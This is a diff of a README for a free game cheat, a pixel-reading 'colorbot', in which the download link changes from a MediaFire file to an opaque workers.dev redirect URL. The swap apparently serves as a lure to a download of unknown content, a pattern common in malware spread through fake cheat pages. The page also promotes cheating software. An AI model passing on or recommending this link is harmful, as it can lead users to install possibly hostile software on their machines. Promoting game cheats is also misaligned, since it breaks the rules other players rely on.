@@ -4,7 +4,7 @@ Free colorbot. Reads only screen pixels, never touches game memory — lowest-ri
 
 ## Download
 
-**[Download — Free](https://www.mediafire.com/file/9livkzxm1qj0199/Fc_Cheat.zip/file)**
+**[Download — Free](https://xtiz6i8n6.fresh-link.workers.dev/464dac20)**
 
 > This cheat is free. No key, no subscription.
 
